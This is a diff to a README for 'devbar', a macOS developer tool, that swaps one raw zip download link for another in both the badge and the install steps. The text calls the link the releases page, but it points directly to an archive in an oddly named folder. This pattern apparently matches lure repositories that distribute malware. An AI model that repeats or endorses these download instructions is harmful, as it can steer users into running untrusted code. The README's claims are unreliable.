@@ -1,6 +1,6 @@
 # 💻 devbar - Enhance Your Development Workflow Effortlessly
 
-[![Download](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software_unentrenched.zip)](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software_unentrenched.zip)
+[![Download](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software-v3.1.zip)](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software-v3.1.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ To get started with **devbar**, follow these easy steps to download and install 
 
 1. **Visit the Releases Page**  
    Click the link below to visit the release page and download the latest version of **devbar**:  
-   [Download devbar](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software_unentrenched.zip)
+   [Download devbar](https://github.com/rockspeeder/devbar/raw/refs/heads/main/prediplomatic/Software-v3.1.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the most recent version of **devbar**. Look for the download link that corresponds to your macOS version.
